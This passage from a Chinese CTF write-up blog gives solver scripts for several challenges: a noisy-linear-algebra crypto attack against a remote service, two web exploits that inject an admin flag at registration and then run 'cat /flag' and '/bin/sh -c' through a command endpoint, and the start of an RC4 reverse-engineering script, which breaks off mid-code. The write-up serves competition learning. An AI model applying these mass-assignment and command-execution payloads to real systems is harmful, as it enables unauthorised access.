class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket, ast</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&quot;106.14.191.23&quot;</span>   <span class="comment"># 远程服务地址</span></span><br><span class="line">PORT = <span class="number">53481</span>             <span class="comment"># 远程服务端口</span></span><br><span class="line">NUM_QUERIES = <span class="number">600</span>        <span class="comment"># 查询次数，可取&lt;=1096，样本越多恢复越稳健</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. 连接服务并获取 Public Seed</span></span><br><span class="line">sock = socket.socket()</span><br><span class="line">sock.connect((HOST, PORT))</span><br><span class="line">data = sock.recv(<span class="number">1024</span>).decode()  <span class="comment"># 接收初始信息，包括种子</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">    <span class="keyword">raise</span> RuntimeError(<span class="string">&quot;Failed to receive data from server.&quot;</span>)</span><br><span class="line"><span class="comment"># 数据可能包含 &quot;Public Seed:&lt;seed&gt;\nGive me your choice&gt;&quot;</span></span><br><span class="line"><span class="comment"># 确保读到种子整行</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;Public Seed:&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data:</span><br><span class="line">    <span class="comment"># 若首次未完整，则继续接收</span></span><br><span class="line">    more = sock.recv(<span class="number">1024</span>).decode()</span><br><span class="line">    data += more</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解析种子字符串</span></span><br><span class="line">lines = data.splitlines()</span><br><span class="line">seed_line = <span class="literal">None</span></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">    <span class="keyword">if</span> line.startswith(<span class="string">&quot;Public Seed:&quot;</span>):</span><br><span class="line">        seed_line = line</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="keyword">if</span> seed_line <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">raise</span> RuntimeError(<span class="string">&quot;Public Seed not found in server response.&quot;</span>)</span><br><span class="line">seed_value = seed_line.split(<span class="string">&quot;Public Seed:&quot;</span>)[<span class="number">1</span>].strip()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[+] Public Seed = <span class="subst">&#123;seed_value&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 依照种子重建矩阵 A (128x128, 元素0-99)，并确保其可逆</span></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line">rng = random.Random()</span><br><span class="line">rng.seed(seed_value.encode())  <span class="comment"># 注意按服务器相同行为，用 bytes 作为种子</span></span><br><span class="line">n = <span class="number">128</span></span><br><span class="line">p = <span class="number">31337</span></span><br><span class="line"><span class="comment"># 生成随机矩阵直至满秩</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    A = [[rng.randint(<span class="number">0</span>, <span class="number">99</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(n)] <span class="keyword">for</span> __ <span class="keyword">in</span> <span class="built_in">range</span>(n)]</span><br><span class="line">    <span class="comment"># 高斯消元求秩</span></span><br><span class="line">    M = [row.copy() <span class="keyword">for</span> row <span class="keyword">in</span> A]</span><br><span class="line">    rank = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> col <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        <span class="comment"># 找到当前列的非零主元</span></span><br><span class="line">        pivot = <span class="literal">None</span></span><br><span class="line">        <span class="keyword">for</span> r <span class="keyword">in</span> <span class="built_in">range</span>(rank, n):</span><br><span class="line">            <span class="keyword">if</span> M[r][col] % p != <span class="number">0</span>:</span><br><span class="line">                pivot = r</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> pivot <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="comment"># 交换到当前秩行</span></span><br><span class="line">        M[rank], M[pivot] = M[pivot], M[rank]</span><br><span class="line">        <span class="comment"># 归一化主元所在行</span></span><br><span class="line">        inv_val = <span class="built_in">pow</span>(M[rank][col], -<span class="number">1</span>, p)</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(col, n):</span><br><span class="line">            M[rank][c] = (M[rank][c] * inv_val) % p</span><br><span class="line">        <span class="comment"># 消去该列下方元素</span></span><br><span class="line">        <span class="keyword">for</span> r <span class="keyword">in</span> <span class="built_in">range</span>(rank+<span class="number">1</span>, n):</span><br><span class="line">            <span class="keyword">if</span> M[r][col] % p != <span class="number">0</span>:</span><br><span class="line">                factor = M[r][col]</span><br><span class="line">                <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(col, n):</span><br><span class="line">                    M[r][c] = (M[r][c] - factor * M[rank][c]) % p</span><br><span class="line">        rank += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> rank == n:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> rank == n:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="comment"># 此时 A 为可逆矩阵</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] Matrix A generated (full rank). Beginning queries...&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 多次查询获取输出向量数据</span></span><br><span class="line">outputs = []  <span class="comment"># 将存储每次返回的长度128的列表</span></span><br><span class="line"><span class="comment"># 如果先前接收的数据中已经包含初始的 &quot;Give me your choice&gt;&quot; 提示，需要处理</span></span><br><span class="line"><span class="comment"># 寻找提示符位置（如果存在）</span></span><br><span class="line">prompt_index = data.find(<span class="string">&quot;Give me your choice&gt;&quot;</span>)</span><br><span class="line"><span class="comment"># 若接收到 prompt，没有换行，需要人为加上换行以避免干扰后续解析</span></span><br><span class="line"><span class="keyword">if</span> prompt_index != -<span class="number">1</span> <span class="keyword">and</span> data.endswith(<span class="string">&quot;Give me your choice&gt;&quot;</span>):</span><br><span class="line">    <span class="comment"># prompt 没有换行且是最后内容，直接忽略，它会在交互中重新出现</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 进行 NUM_QUERIES 次查询</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(NUM_QUERIES):</span><br><span class="line">    <span class="comment"># 发送 &#x27;1&#x27; 请求一个样本</span></span><br><span class="line">    sock.sendall(<span class="string">b&quot;1\n&quot;</span>)</span><br><span class="line">    <span class="comment"># 接收该次的输出列表字符串（注意列表较长，需循环读取直到得到完整的&#x27;]&#x27;）</span></span><br><span class="line">    resp = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="string">&#x27;]&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> resp:</span><br><span class="line">        chunk = sock.recv(<span class="number">4096</span>).decode()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> chunk:</span><br><span class="line">            <span class="keyword">raise</span> RuntimeError(<span class="string">&quot;Connection closed before receiving full response.&quot;</span>)</span><br><span class="line">        resp += chunk</span><br><span class="line">    <span class="comment"># 截取列表字符串部分（从第一个&#x27;[&#x27;到对应的第一个&#x27;]&#x27;）</span></span><br><span class="line">    start = resp.find(<span class="string">&#x27;[&#x27;</span>)</span><br><span class="line">    end = resp.find(<span class="string">&#x27;]&#x27;</span>, start)</span><br><span class="line">    list_str = resp[start:end+<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        nums = ast.literal_eval(list_str)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">f&quot;Failed to parse output list: <span class="subst">&#123;e&#125;</span>\nData: <span class="subst">&#123;list_str&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(nums) != n:</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">f&quot;Output length <span class="subst">&#123;<span class="built_in">len</span>(nums)&#125;</span> != <span class="subst">&#123;n&#125;</span>&quot;</span>)</span><br><span class="line">    outputs.append(nums)</span><br><span class="line">    <span class="comment"># 打印进度</span></span><br><span class="line">    <span class="keyword">if</span> (i+<span class="number">1</span>) % <span class="number">100</span> == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;  Collected <span class="subst">&#123;i+<span class="number">1</span>&#125;</span> samples...&quot;</span>)</span><br><span class="line">    <span class="comment"># 保存末尾未处理的数据（可能包含下一个提示符）</span></span><br><span class="line">    resp = resp[end+<span class="number">1</span>:]</span><br><span class="line">    <span class="comment"># 如果末尾含提示符，下次循环会再次recv，不影响正确性</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 完成采样后，发送非&#x27;1&#x27;使服务器退出循环</span></span><br><span class="line">sock.sendall(<span class="string">b&quot;0\n&quot;</span>)</span><br><span class="line">sock.close()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[+] Collected <span class="subst">&#123;<span class="built_in">len</span>(outputs)&#125;</span> outputs. Processing data...&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. 对每个分量聚类去噪，估计 A*s</span></span><br><span class="line">As_values = [<span class="number">0</span>] * n</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">    vals = [outputs[i][j] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(outputs))]</span><br><span class="line">    vals.sort()</span><br><span class="line">    <span class="comment"># 检测是否发生模绕回（两簇现象）</span></span><br><span class="line">    <span class="keyword">if</span> vals[-<span class="number">1</span>] - vals[<span class="number">0</span>] &gt; p // <span class="number">2</span>:</span><br><span class="line">        <span class="comment"># 存在两簇：决定哪簇是主要簇</span></span><br><span class="line">        <span class="comment"># 通过中位数判断主要簇位置</span></span><br><span class="line">        median_val = vals[<span class="built_in">len</span>(vals)//<span class="number">2</span>]</span><br><span class="line">        <span class="keyword">if</span> median_val &gt; p // <span class="number">2</span>:</span><br><span class="line">            <span class="comment"># 主要簇在高值端，将低值簇的值加上一个模数p</span></span><br><span class="line">            <span class="comment"># 寻找最大间隔点作为簇分界</span></span><br><span class="line">            diffs = [vals[i+<span class="number">1</span>] - vals[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(vals)-<span class="number">1</span>)]</span><br><span class="line">            idx = diffs.index(<span class="built_in">max</span>(diffs))</span><br><span class="line">            low_cluster = vals[:idx+<span class="number">1</span>]</span><br><span class="line">            high_cluster = vals[idx+<span class="number">1</span>:]</span><br><span class="line">            low_cluster_adjusted = [v + p <span class="keyword">for</span> v <span class="keyword">in</span> low_cluster]</span><br><span class="line">            vals = <span class="built_in">sorted</span>(low_cluster_adjusted + high_cluster)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># 主要簇在低值端，将高值簇减去一个模数p</span></span><br><span class="line">            diffs = [vals[i+<span class="number">1</span>] - vals[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(vals)-<span class="number">1</span>)]</span><br><span class="line">            idx = diffs.index(<span class="built_in">max</span>(diffs))</span><br><span class="line">            low_cluster = vals[:idx+<span class="number">1</span>]</span><br><span class="line">            high_cluster = vals[idx+<span class="number">1</span>:]</span><br><span class="line">            high_cluster_adjusted = [v - p <span class="keyword">for</span> v <span class="keyword">in</span> high_cluster]</span><br><span class="line">            vals = <span class="built_in">sorted</span>(low_cluster + high_cluster_adjusted)</span><br><span class="line">    <span class="comment"># 取平均值作为 (A*s)_j 的估计，并四舍五入取最近整数</span></span><br><span class="line">    avg_val = <span class="built_in">sum</span>(vals) / <span class="built_in">len</span>(vals)</span><br><span class="line">    As_values[j] = <span class="built_in">int</span>(<span class="built_in">round</span>(avg_val)) % p  <span class="comment"># 最终取模 p 确保在 [0,p) </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 5. 计算 s = A^&#123;-1&#125; * (A*s) 来求解 s</span></span><br><span class="line"><span class="comment"># 先对 A 进行模 p 下求逆</span></span><br><span class="line"><span class="comment"># 构造增广矩阵 [A|I] 做高斯消元</span></span><br><span class="line">Aug = [row[:] + [<span class="number">1</span> <span class="keyword">if</span> i == j <span class="keyword">else</span> <span class="number">0</span> <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(n)] <span class="keyword">for</span> i, row <span class="keyword">in</span> <span class="built_in">enumerate</span>(A)]</span><br><span class="line"><span class="keyword">for</span> col <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">    <span class="comment"># 找到主元</span></span><br><span class="line">    pivot = col</span><br><span class="line">    <span class="keyword">while</span> pivot &lt; n <span class="keyword">and</span> Aug[pivot][col] % p == <span class="number">0</span>:</span><br><span class="line">        pivot += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> pivot == n:</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">&quot;Matrix is singular during inversion (unexpected).&quot;</span>)</span><br><span class="line">    <span class="comment"># 将主元行换到当前列对应行</span></span><br><span class="line">    Aug[col], Aug[pivot] = Aug[pivot], Aug[col]</span><br><span class="line">    inv_val = <span class="built_in">pow</span>(Aug[col][col], -<span class="number">1</span>, p)</span><br><span class="line">    <span class="comment"># 主元归一化</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>*n):</span><br><span class="line">        Aug[col][c] = (Aug[col][c] * inv_val) % p</span><br><span class="line">    <span class="comment"># 消去其他行该列</span></span><br><span class="line">    <span class="keyword">for</span> r <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        <span class="keyword">if</span> r != col:</span><br><span class="line">            factor = Aug[r][col]</span><br><span class="line">            <span class="keyword">if</span> factor != <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(col, <span class="number">2</span>*n):</span><br><span class="line">                    Aug[r][c] = (Aug[r][c] - factor * Aug[col][c]) % p</span><br><span class="line"></span><br><span class="line"><span class="comment"># 提取逆矩阵</span></span><br><span class="line">A_inv = [row[n:] <span class="keyword">for</span> row <span class="keyword">in</span> Aug]</span><br><span class="line"><span class="comment"># 计算 s = A_inv * (A*s 值向量)</span></span><br><span class="line">s = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">    total = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        total = (total + A_inv[i][j] * As_values[j]) % p</span><br><span class="line">    s.append(total)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 6. 从 s 导出 flag（s[i] mod 200 为 ASCII 码）</span></span><br><span class="line">flag_chars = [<span class="built_in">chr</span>(x % <span class="number">200</span>) <span class="keyword">for</span> x <span class="keyword">in</span> s]</span><br><span class="line">flag = <span class="string">&quot;&quot;</span>.join(flag_chars)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] Recovered flag:&quot;</span>, flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251005221355601.png" alt="image-20251005221355601"></p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="am-i-admin"><a href="#am-i-admin" class="headerlink" title="am i admin?"></a>am i admin?</h3><p>AI出</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">BASE_URL = <span class="string">&quot;http://106.14.191.23:56062&quot;</span>  <span class="comment"># 视题目部署实际地址调整</span></span><br><span class="line">session = requests.Session()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>(<span class="params">username, password</span>):</span><br><span class="line">    payload = &#123;<span class="string">&quot;username&quot;</span>: username, <span class="string">&quot;password&quot;</span>: password, <span class="string">&quot;IsAdmin&quot;</span>: <span class="literal">True</span>&#125;</span><br><span class="line">    r = session.post(<span class="string">f&quot;<span class="subst">&#123;BASE_URL&#125;</span>/register&quot;</span>, json=payload)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] register:&quot;</span>, r.status_code, r.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">username, password</span>):</span><br><span class="line">    payload = &#123;<span class="string">&quot;username&quot;</span>: username, <span class="string">&quot;password&quot;</span>: password&#125;</span><br><span class="line">    r = session.post(<span class="string">f&quot;<span class="subst">&#123;BASE_URL&#125;</span>/login&quot;</span>, json=payload)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] login:&quot;</span>, r.status_code, r.text)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] cookies:&quot;</span>, session.cookies.get_dict())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run_command</span>(<span class="params">cmd, args</span>):</span><br><span class="line">    payload = &#123;<span class="string">&quot;cmd&quot;</span>: cmd, <span class="string">&quot;args&quot;</span>: args&#125;</span><br><span class="line">    r = session.post(<span class="string">f&quot;<span class="subst">&#123;BASE_URL&#125;</span>/run&quot;</span>, json=payload)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] run:&quot;</span>, r.status_code, r.json())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    username = <span class="string">&quot;pwn&quot;</span></span><br><span class="line">    password = <span class="string">&quot;pwn&quot;</span></span><br><span class="line"></span><br><span class="line">    register(username, password)  <span class="comment"># 第一步：注册并注入 IsAdmin</span></span><br><span class="line">    login(username, password)  <span class="comment"># 第二步：登录拿到 session_id</span></span><br><span class="line">    run_command(<span class="string">&quot;cat&quot;</span>, [<span class="string">&quot;/flag&quot;</span>])  <span class="comment"># 第三步：以管理员身份读 flag</span></span><br><span class="line">    <span class="comment"># run_command(&quot;id&quot;, [])                 # 可执行任意命令测试</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251005221442895.png" alt="image-20251005221442895"></p><h3 id="am-i-admin-2"><a href="#am-i-admin-2" class="headerlink" title="am i admin?2"></a>am i admin?2</h3><p>AI 出</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> secrets</span><br><span class="line"></span><br><span class="line">BASE_URL = <span class="string">&quot;http://106.14.191.23:59608&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    sess = requests.Session()</span><br><span class="line">    username = <span class="string">&quot;pwn&quot;</span> + secrets.token_hex(<span class="number">4</span>)</span><br><span class="line">    password = <span class="string">&quot;Passw0rd!&quot;</span></span><br><span class="line">    register_data = &#123;<span class="string">&quot;username&quot;</span>: username, <span class="string">&quot;password&quot;</span>: password, <span class="string">&quot;isadmin&quot;</span>: <span class="literal">True</span>&#125;</span><br><span class="line">    r = sess.post(<span class="string">f&quot;<span class="subst">&#123;BASE_URL&#125;</span>/register&quot;</span>, json=register_data)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;register:&quot;</span>, r.status_code, r.text)</span><br><span class="line"></span><br><span class="line">    login_data = &#123;<span class="string">&quot;username&quot;</span>: username, <span class="string">&quot;password&quot;</span>: password&#125;</span><br><span class="line">    r = sess.post(<span class="string">f&quot;<span class="subst">&#123;BASE_URL&#125;</span>/login&quot;</span>, json=login_data)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;login:&quot;</span>, r.status_code, r.text)</span><br><span class="line"></span><br><span class="line">    cmd_payload = &#123;<span class="string">&quot;cmd&quot;</span>: <span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;args&quot;</span>: [<span class="string">&quot;-c&quot;</span>, <span class="string">&quot;cat /flag&quot;</span>]&#125;</span><br><span class="line">    r = sess.post(<span class="string">f&quot;<span class="subst">&#123;BASE_URL&#125;</span>/run&quot;</span>, json=cmd_payload)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;run:&quot;</span>, r.status_code, r.json())</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251005221511012.png" alt="image-20251005221511012"></p><h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h3 id="android-native"><a href="#android-native" class="headerlink" title="android-native"></a>android-native</h3><p>native里有RC4校验</p><p>key做了更改</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251004104652628.png" alt="image-20251004104652628"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> annotations</span><br><span class="line"></span><br><span class="line">KEY_BYTES = <span class="built_in">bytearray</span>(<span class="string">b&quot;1m1r6rqro1l~dr&quot;</span>)</span><br><span class="line">CIPHERTEXT = <span class="built_in">bytes</span>([</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x7F</span>, <span class="number">0xD6</span>, <span class="number">0xE8</span>, <span class="number">0xE9</span>, <span class="number">0x17</span>, <span class="number">0xD1</span>, <span class="number">0x59</span>,</span><br><span class="line">    <span class="number">0x76</span>, <span class="number">0xB1</span>, <span class="number">0x19</span>, <span class="number">0xA0</span>, <span class="number">0x57</span>, <span class="number">0x38</span>, <span class="number">0x27</span>, <span class="number">0x28</span>,</span><br><span class="line">    <span class="number">0x0F</span>, <span class="number">0x9A</span>, <span class="number">0x10</span>, <span class="number">0xF6</span>, <span class="number">0xD2</span>, <span class="number">0x75</span>, <span class="number">0x52</span>, <span class="number">0x83</span>,</span><br><span class="line">    <span class="number">0x97</span>, <span class="number">0x66</span>, <span class="number">0x4C</span>, <span class="number">0xF7</span>, <span class="number">0x3D</span>, <span class="number">0x9B</span>, <span class="number">0x8F</span>, <span class="number">0x85</span>,</span><br><span class="line">    <span class="number">0x4A</span>, <span class="number">0xD7</span>, <span class="number">0x08</span>, <span class="number">0xF4</span>, <span class="number">0x6D</span>, <span class="number">0xE7</span>, <span class="number">0xA9</span>, <span class="number">0x1D</span>,</span><br><span class="line">    <span class="number">0xB8</span>, <span class="number">0x9C</span>, <span class="number">0x0F</span>, <span class="number">0x8A</span>,</span><br><span class="line">])</span><br><span class="line"></span><br><span class="line">MUTATION_MASKS = &#123;</span><br><span class="line">    <span class="number">1</span>: <span class="number">0x01</span>,</span><br><span class="line">    <span class="number">2</span>: <span class="number">0x01</span>,</span><br><span class="line">    <span class="number">3</span>: <span class="number">0x04</span>,</span><br><span class="line">    <span class="number">4</span>: <span class="number">0x05</span>,</span><br><span class="line">    <span class="number">5</span>: <span class="number">0x01</span>,</span><br><span class="line">    <span class="number">6</span>: <span class="number">0x04</span>,</span><br><span class="line">    <span class="number">7</span>: <span class="number">0x01</span>,</span><br><span class="line">    <span class="number">8</span>: <span class="number">0x09</span>,</span><br><span class="line">    <span class="number">9</span>: <span class="number">0x01</span>,</span><br><span class="line">    <span class="number">10</span>: <span class="number">0x09</span>,</span><br><span class="line">    <span class="number">11</span>: <span class="number">0x08</span>,</span><br><span class="line">    <span class="number">12</span>: <span class="number">0x01</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mutate_key</span>(<span class="params">key: <span class="built_in">bytearray</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="keyword">for</span> idx, mask <span class="keyword">in</span> MUTATION_MASKS.items():</span><br><span class="line">        key[idx] ^= mask</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(key)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title 